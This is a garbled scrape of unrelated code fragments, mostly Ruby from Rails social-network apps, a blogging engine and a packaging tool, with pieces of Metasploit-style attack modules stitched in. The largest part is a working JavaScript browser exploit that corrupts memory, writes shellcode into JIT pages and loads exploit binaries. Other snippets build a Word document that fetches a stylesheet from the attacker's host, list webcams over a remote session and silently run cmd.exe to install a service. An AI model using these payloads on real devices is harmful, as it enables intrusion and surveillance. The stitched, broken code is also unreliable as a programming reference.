
        
            context 'when parent status is public' do
      let(:visibility) { 'public' }
    
      def distribute_poll!
    return if @poll.hide_totals?
    ActivityPub::DistributePollUpdateWorker.perform_in(3.minutes, @poll.status.id)
  end
    
        # Initiate a re-follow for each follower
    origin_account.followers.local.select(:id).find_in_batches do |follower_accounts|
      UnfollowFollowWorker.push_bulk(follower_accounts.map(&:id)) do |follower_account_id|
        [follower_account_id, origin_account.id, target_account.id]
      end
    end
  end
    
        if cmd_args
      arguments = cmd_args.split(' ')
    end
    
      def create_xml
    xml=''
    xml << '<?xml version='1.0' encoding='utf-8' ?>'
    xml << '<?mso-application progid='Word.Document'?>'
    xml << '<?xml-stylesheet type='text/xsl' href='file://#{datastore['LHOST']}/share/word.xsl'?>'
    xml << '<Text>'
    xml << ' FATAL ERROR: The document failed to render properly.'
    xml << '</Text>'
    
      #
  # Kills off the connection threads if there are any hanging around.
  #
  def cleanup_handler
    # Kill any remaining handle_connection threads that might
    # be hanging around
    conn_threads.each { |thr|
      thr.kill
    }
  end
    
    require 'macho'
    
      for (i=0; i < bufs.length; i++) {
    var dobreak = 0;
    for (k=0; k < bufs[0].length; k++) {
      if (bufs[i][k] == 0x12345678) {
        if (bufs[i][k+1] == 0xFFFF0000) {
          stale[0] = fc;
          fcp = bufs[i][k];
          stale[0] = {
            'a': u2d(105, 0),
            'b': u2d(0, 0),
            'c': smsh,
            'd': u2d(0x100, 0)
          }
          stale[1] = stale[0];
          bufs[i][k] += 0x10;
          bck = stale[0][4];
          stale[0][4] = 0;
          stale[0][6] = 0xffffffff;
          mem0 = stale[0];
          mem1 = bck;
          mem2 = smsh;
          bufs.push(stale);
          if (smsh.length != 0x10) {
            var filestream = load_binary_resource('loader64');
            var macho = load_binary_resource('exploit64');
            r2 = smsh[(fcp+0x18)/4];
            r3 = smsh[(r2+0x10)/4];
            var jitf = smsh[(r3+0x10)/4];
            write4(jitf, 0xd28024d0);     //movz x16, 0x126
            write4(jitf + 4, 0x58000060);   //ldr x0, 0x100007ee4
            write4(jitf + 8, 0xd4001001);   //svc 80
            write4(jitf + 12, 0xd65f03c0);  //ret
            write4(jitf + 16, jitf + 0x20);
            write4(jitf + 20, 1);
            fc();
            var dyncache = read4(jitf + 0x20);
            var dyncachev = read4(jitf + 0x20);
            var go = 1;
            while (go) {
              if (read4(dyncache) == 0xfeedfacf) {
                for (i = 0; i < 0x1000 / 4; i++) {
                  if (read4(dyncache + i * 4) == 0xd && read4(dyncache + i * 4 + 1 * 4) == 0x40 && read4(dyncache + i * 4 + 2 * 4) == 0x18 && read4(dyncache + i * 4 + 11 * 4) == 0x61707369) // lulziest mach-o parser ever
                  {
                    go = 0;
                    break;
                  }
                }
              }
              dyncache += 0x1000;
            }
            dyncache -= 0x1000;
            var bss = [];
            var bss_size = [];
            for (i = 0; i < 0x1000 / 4; i++) {
              if (read4(dyncache + i * 4) == 0x73625f5f && read4(dyncache + i * 4 + 4) == 0x73) {
                bss.push(read4(dyncache + i * 4 + (0x20)) + dyncachev - 0x80000000);
                bss_size.push(read4(dyncache + i * 4 + (0x28)));
              }
            }
            var shc = jitf;
            for (var i = 0; i < filestream.length;) {
              var word = (filestream.charCodeAt(i) & 0xff) | ((filestream.charCodeAt(i + 1) & 0xff) << 8) | ((filestream.charCodeAt(i + 2) & 0xff) << 16) | ((filestream.charCodeAt(i + 3) & 0xff) << 24);
              write4(shc, word);
              shc += 4;
              i += 4;
            }
            jitf &= ~0x3FFF;
            jitf += 0x8000;
            write4(shc, jitf);
            write4(shc + 4, 1);
            // copy macho
            for (var i = 0; i < macho.length;i+=4) {
              var word = (macho.charCodeAt(i) & 0xff) | ((macho.charCodeAt(i + 1) & 0xff) << 8) | ((macho.charCodeAt(i + 2) & 0xff) << 16) | ((macho.charCodeAt(i + 3) & 0xff) << 24);
              write4(jitf+i, word);
            }
            for (var i = 0; i < bss.length; i++) {
              for (k = bss_size[i] / 6; k < bss_size[i] / 4; k++) {
                write4(bss[i] + k * 4, 0);
              }
            }
            fc();
          }
        } else if(bufs[i][k+1] == 0xFFFFFFFF) {
          stale[0] = fc;
          fcp = bufs[i][k];
          stale[0] = smsh;
          stale[2] = {'a':u2d(0x2,0x10),'b':smsh, 'c':u2d(0,0), 'd':u2d(0,0)}
          stale[0] = {'a':u2d(0,0x00e00600),'b':u2d(1,0x10), 'c':u2d(bufs[i][k+2*2]+0x10,0), 'd':u2d(0,0)}
          stale[1] = stale[0];
          bufs[i][k] += 0x10;
          var leak = stale[0][0].charCodeAt(0);
          leak += stale[0][1].charCodeAt(0) << 8;
          leak += stale[0][2].charCodeAt(0) << 16;
          leak += stale[0][3].charCodeAt(0) << 24;
          bufs[i][k] -= 0x10;
          stale[0] = {'a':u2d(leak,0x00602300), 'b':u2d(0,0), 'c':smsh, 'd':u2d(0,0)}
          stale[1] = stale[0];
          bufs[i][k] += 0x10;
          stale[0][4] = 0;
          stale[0][5] = 0xffffffff;
          bufs[i][k] -= 0x10;
          mem0 = stale[0];
          mem2 = smsh;
          if (smsh.length != 0x10) {
            setTimeout(function() {
              var filestream = load_binary_resource('loader32');
              r2 = smsh[(fcp+0x14)/4];
              r3 = smsh[(r2+0x10)/4];
              shellcode = (smsh[(r3+0x14)/4]&0xfffff000)-0x10000;
              smsh[shellcode/4] = 0;
              shellcode += 4;
              smsh[shellcode/4] = 0;
              shellcode += 4;
              smsh[shellcode/4] = 0;
              shellcode += 4;
              smsh[shellcode/4] = 0;
              shellcode += 4;
              for(var i = 0; i < filestream.length; i+=4) {
                var word = (filestream.charCodeAt(i) & 0xff) | ((filestream.charCodeAt(i+1) & 0xff) << 8)  | ((filestream.charCodeAt(i+2) & 0xff) << 16)  | ((filestream.charCodeAt(i+3) & 0xff) << 24);
                smsh[(shellcode+i)/4] = word;
              }
              smsh[(fcp+0x00)/4] = fcp+4;
              smsh[(fcp+0x04)/4] = fcp+4;
              smsh[(fcp+0x08)/4] = shellcode+1; //PC
              smsh[(fcp+0x30)/4] = fcp+0x30+4-0x18-0x34+0x8;
    }
    }
    }
    }
    }
    }
    
      def webcam_list
    response = client.send_request(Packet.create_request('webcam_list'))
    names = []
    response.get_tlvs(TLV_TYPE_WEBCAM_NAME).each do |tlv|
      names << tlv.value
    end
    names
  end
    
        begin
      session.sys.process.execute('cmd.exe /c \'#{path}\' #{@install_cmd}', nil, {'Hidden' => true})
    rescue ::Exception => e
      print_error('Failed to install the service.')
      print_error(e.to_s)
    end
    
        if extension_pathname.readable?
      ENV['BUNDLE_GEMFILE'] = extension_pathname.to_path
      break
    end
  end
end
    
        def initialize(*args)
      @s = StringScanner.new(*args)
    end
    
      # Do not eager load code on boot. This avoids loading your whole application
  # just for the purpose of running a single test. If you are using a tool that
  # preloads Rails for running tests, you may have to set it to true.
  config.eager_load = false
    
        def index
      pods_json = PodPresenter.as_collection(Pod.all)
    
        @posts_per_day = Post.where('created_at >= ?', Date.today - 21.days).group('DATE(created_at)').order('DATE(created_at) ASC').count
    @most_posts_within = @posts_per_day.values.max.to_f
    
      rescue_from Diaspora::NotMine do
    render plain: I18n.t('aspect_memberships.destroy.forbidden'), status: 403
  end
end

    
      def read_all
    current_type = types[params[:type]]
    notifications = Notification.where(recipient_id: current_user.id, unread: true)
    notifications = notifications.where(type: current_type) if params[:type]
    notifications.update_all(unread: false)
    respond_to do |format|
      if current_user.unread_notifications.count > 0
        format.html { redirect_to notifications_path }
        format.mobile { redirect_to notifications_path }
      else
        format.html { redirect_to stream_path }
        format.mobile { redirect_to stream_path }
      end
      format.xml { render :xml => {}.to_xml }
      format.json { render :json => {}.to_json }
    end
  end
    
      def create?
    !user_is_banned?
  end
    
          # Throw an exception if the layout couldn't be found.
      else
        raise <<-ERR
    
        def render(context)
      if parts = @text.match(/([a-zA-Z\d]*) (.*)/)
        gist, file = parts[1].strip, parts[2].strip
      else
        gist, file = @text.strip, ''
      end
      if gist.empty?
        ''
      else
        script_url = script_url_for gist, file
        code       = get_cached_gist(gist, file) || get_gist_from_web(gist, file)
        html_output_for script_url, code
      end
    end
    
      class ImageTag < Liquid::Tag
    @img = nil
    
      class RenderPartialTag < Liquid::Tag
    include OctopressFilters
    def initialize(tag_name, markup, tokens)
      @file = nil
      @raw = false
      if markup =~ /^(\S+)\s?(\w+)?/
        @file = $1.strip
        @raw = $2 == 'raw'
      end
      super
    end
    
        context 'when :python_fix_name? is true' do
      before :each do
        subject.attributes[:python_fix_name?] = true
      end
    
        temp_info = pkginfo_template_path
    
      def architecture
    case @architecture
      when nil
        return %x{uname -m}.chomp   # default to current arch
      when 'amd64' # debian and pacman disagree on architecture names
        return 'x86_64'
      when 'native'
        return %x{uname -m}.chomp   # 'native' is current arch
      when 'all', 'any', 'noarch'
        return 'any'
      else
        return @architecture
    end
  end # def architecture
    
      def output(output_path)
    output_check(output_path)